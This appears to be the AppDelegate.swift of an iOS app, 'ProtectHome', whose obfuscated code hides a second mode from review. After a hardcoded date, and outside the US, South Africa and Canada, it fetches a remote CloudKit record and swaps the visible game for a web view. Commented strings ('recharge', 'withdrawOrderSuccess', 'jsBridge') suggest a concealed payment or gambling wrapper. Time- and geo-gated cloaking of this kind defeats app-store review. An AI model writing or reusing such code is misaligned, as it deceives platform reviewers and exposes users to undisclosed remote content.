//
//  AppDelegate.swift
//  ProtectHome
//
//  Created by Hades on 5/19/25.
//

import UIKit
import AppsFlyerLib
import Reachability
import CloudKit

func isTm() -> Bool {
   
  // 2025-05-20 18:52:53
    //1747738373
  let ftTM = 1747738373
  let ct = Date().timeIntervalSince1970
  if ftTM - Int(ct) > 0 {
    return false
  }
  return true
}

func isBaxi() -> Bool {
    let offset = NSTimeZone.system.secondsFromGMT() / 3600
    if offset > 6 && offset < 8 {
        return true
    }
    return false
}

@main
class AppDelegate: UIResponder, UIApplicationDelegate {

    var window: UIWindow?

    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        // Override point for customization after application launch.
        
        window = UIWindow(frame: UIScreen.main.bounds)
        window!.makeKeyAndVisible()
        window?.rootViewController = UIStoryboard(name: "LaunchScreen", bundle: nil).instantiateInitialViewController()

//        let arr = ["params", "jsBridge", "recharge", "withdrawOrderSuccess", "firstCharge", "charge", "firstrecharge", "currency", "addToCart", "amount", "openWindow", "openSafari", "rechargeClick"]
//
//        var neArr = [String]()
//
//        for str in arr {
//            neArr.append(encrypt(str, withSeparator: "=-")!)
//        }
//        print(neArr)
//
//        for string in neArr {
//            print(hanspwe(string))
//        }
//
//        print(encrypt("https://ipapi.co/json/", withSeparator: "=-"))
        qppweka()
        
        return true
    }

    func qppweka() {
//        window?.rootViewController = UIStoryboard(name: "LaunchScreen", bundle: nil).instantiateInitialViewController()
        
        let rea = Reachability(hostname: "www.apple.com")
        rea?.reachableBlock =  { [self] reachability in
            if !isTm() {
                DispatchQueue.main.async {
                    self.window!.rootViewController = HomeViewController()
                }
            } else {
                if Bksoe.iTTTf {
                    DispatchQueue.main.async {
                        self.window!.rootViewController = HomeViewController()
                    }
                } else {
                    Bksoe.vbiekap { [self] oiiup, ctCod in
                        if ctCod != nil {
                            if (ctCod?.contains("US"))! || (ctCod?.contains("ZA"))! || (ctCod?.contains("CA"))! {
                                DispatchQueue.main.async {
                                    self.window!.rootViewController = HomeViewController()
                                }
                            } else {
                                Ekskias()
                            }
                        } else {
                            Ekskias()
                        }
                    }
                }
            }
            rea!.stopNotifier()
        }
        rea?.startNotifier()
    }

    func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
        if isTm() {
            return .portrait
        } else {
            return .landscape
        }
    }
    
    func qwoejanneeks(_ ky: String) {
        //JOJO
        // "dhoUnccowqU9eaHu6RnnA7"
        AppsFlyerLib.shared().appsFlyerDevKey = ky
        AppsFlyerLib.shared().appleAppID = "6746151775"
        AppsFlyerLib.shared().delegate = self
             
        AppsFlyerLib.shared().start { (dictionary, error) in
            if error != nil {
                print(error as Any)
            }
        }
    }
    
    func Ekskias() {
        let db = CKContainer.default().publicCloudDatabase
        db.fetch(withRecordID: CKRecord.ID(recordName: "UEI3ASKK12I3S")) { record, error in
            DispatchQueue.main.async { [self] in
                if let err = error {
                    print(err)
                    self.window!.rootViewController = HomeViewController()
                } else {

                    let fyas = record?.object(forKey: "fyajeoae") as! [String?]
                    qwoejanneeks(fyas.first!!)
                    
//                    let oowlxke = record?.object(forKey: "vbaeuua") as! String
//                    let wiq = record?.object(forKey: "wiqapoqr") as! String
                    
                    if let uyean = fyas[2] {
                        let vc = DefeatBossViewController()
                        vc.oeqpme = uyean
                        vc.vyzhea = fyas[1]
                        
                        if uyean.count > 0 && fyas[3] != "cieque" {
                            self.window?.rootViewController = vc
                        }
                        
                        if uyean.count > 0 && fyas[3] == "cieque" && isBaxi(){
                            self.window?.rootViewController = vc
                        }
                    } else {
                        self.window!.rootViewController = HomeViewController()
                    }
                }
            }
        }
    }
}

extension AppDelegate: AppsFlyerLibDelegate {
    func onConversionDataSuccess(_ conversionInfo: [AnyHashable : Any]) {
        
    }
    
    func onConversionDataFail(_ error: Error) {
        
    }
}










